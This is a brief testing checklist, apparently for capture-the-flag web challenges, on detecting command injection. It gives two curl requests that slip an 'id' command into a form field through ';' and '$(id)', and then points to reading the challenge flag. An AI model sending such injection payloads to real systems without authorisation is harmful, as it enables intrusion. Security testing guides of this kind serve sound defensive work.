# Web: Command Injection

## When to Use

Input reaches shell commands, ping, nslookup, file conversion, git, archive, or image tools.

## Quick Checks

```bash
curl -i "$TARGET/" --data-urlencode 'x=127.0.0.1;id'
curl -i "$TARGET/" --data-urlencode 'x=127.0.0.1$(id)'
```

## Next Action

Confirm injection with harmless commands, then read the challenge flag path.

## Evidence Standard

Save request and response transcript. Do not run destructive commands.
